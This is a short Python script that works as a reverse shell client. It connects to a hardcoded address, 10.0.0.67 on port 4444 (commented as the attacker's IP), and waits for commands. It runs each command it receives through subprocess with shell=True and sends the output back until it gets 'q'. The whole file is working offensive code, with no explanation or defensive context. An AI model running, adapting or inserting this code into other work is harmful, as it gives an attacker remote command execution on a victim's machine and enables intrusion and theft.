#!/usr/bin/python

import subprocess
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.67", 4444))  #att ip


while True:
	data = sock.recv(2048)
	if not data:
		break

	# decode safely and normalize the command
	command = data.decode(errors='ignore').strip()

	if command == "q":
		break
	if not command:
		# ignore empty commands
		continue

	proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	# read stdout and stderr bytes and send them back
	command_result = proc.stdout.read() + proc.stderr.read()
	# ensure we send some bytes back
	if not command_result:
		command_result = b'\n'
	try:
		sock.sendall(command_result)
	except BrokenPipeError:
		break

sock.close()
